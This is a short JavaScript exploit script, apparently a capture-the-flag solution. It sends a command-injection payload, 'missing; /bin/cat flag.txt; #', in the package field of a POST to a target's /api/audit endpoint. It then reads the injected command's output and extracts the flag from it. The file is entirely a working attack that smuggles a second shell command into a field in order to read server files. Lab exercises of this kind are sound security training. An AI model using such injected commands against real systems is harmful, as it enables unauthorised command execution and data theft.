const base = process.env.CTF_URL || "http://127.0.0.1:31337";
const payload = "missing; /bin/cat flag.txt; #";

const response = await fetch(`${base}/api/audit`, {
  method: "POST",
  headers: { "content-type": "application/json" },
  body: JSON.stringify({ package: payload }),
});

const body = await response.json();
const output = `${body.stdout || ""}\n${body.stderr || ""}`;
const flag = output.match(/[A-Z0-9_]*CTF\{[^}\r\n]+\}/)?.[0];

if (!response.ok || !flag) {
  console.error(JSON.stringify(body, null, 2));
  process.exit(1);
}

console.log(flag);
